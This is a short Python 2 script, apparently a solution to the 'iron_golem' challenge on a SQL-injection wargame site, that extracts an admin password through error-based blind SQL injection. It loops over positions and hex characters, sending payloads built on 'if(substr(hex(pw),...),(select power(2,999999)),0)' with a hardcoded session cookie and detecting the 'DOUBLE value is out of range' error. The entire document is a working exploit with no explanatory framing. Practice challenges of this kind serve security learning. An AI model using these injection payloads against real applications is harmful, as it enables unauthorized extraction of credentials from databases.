#!/usr/bin/python
#-*-coding:utf-8  -*-

#length = 32
#hex(pw) length = 64
#pw = 32 ascii words 
#Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests


password=""
guestword=""
heex = "0123456789abcdef"
'''
for k in range(1,100):
	url="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or id='admin' and if(length(pw)="+str(k)+",(select power(2,999999)),0) %23"
	r = requests.post(url,cookies=(dict(PHPSESSID="gaqt152sqjdlgbbjj31r85klq5")))
	print "Finding length of password : "+str(k)
	
	if 'DOUBLE value is out of range' in r.text:
		print "length is : " + str(k)
		length = k
		break
'''
k=64

for j in range(1,k+1):
	for i in heex:
		url="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or id='admin' and if(substr(hex(pw),"+str(j)+",1)="+str(i)+",(select power(2,999999)),0) %23"
		r = requests.post(url,cookies=(dict(PHPSESSID="gaqt152sqjdlgbbjj31r85klq5")))
		print "Finding " + str(j)+"th password's hex : " +str(i)
	
		if 'DOUBLE value is out of range' in r.text:
			password += str(i)
			print "password found :" + password
			break


